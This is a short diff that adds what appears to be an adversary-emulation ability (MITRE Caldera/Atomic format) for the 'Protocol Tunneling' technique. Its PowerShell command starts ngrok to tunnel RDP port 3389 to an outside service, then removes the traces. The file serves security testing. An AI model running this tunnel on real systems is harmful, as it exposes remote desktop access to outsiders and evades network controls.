@@ -1,0 +1,22 @@
+---
+- id: f49909057fa568660a6f268b7261e446
+  name: run ngrok
+  description: 'Download and run ngrok. Create tunnel to chosen port.
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1572
+    name: Protocol Tunneling
+  platforms:
+    windows:
+      psh:
+        command: C:\Users\Public\ngrok\ngrok.exe config add-authtoken N/A | Out-Null;
+          Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp 3389 } | Out-Null;
+          Start-Sleep -s 5 ; Stop-Job -Name Job1 | Out-Null
+        payloads: []
+        cleanup: Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore; Remove-Item
+          C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
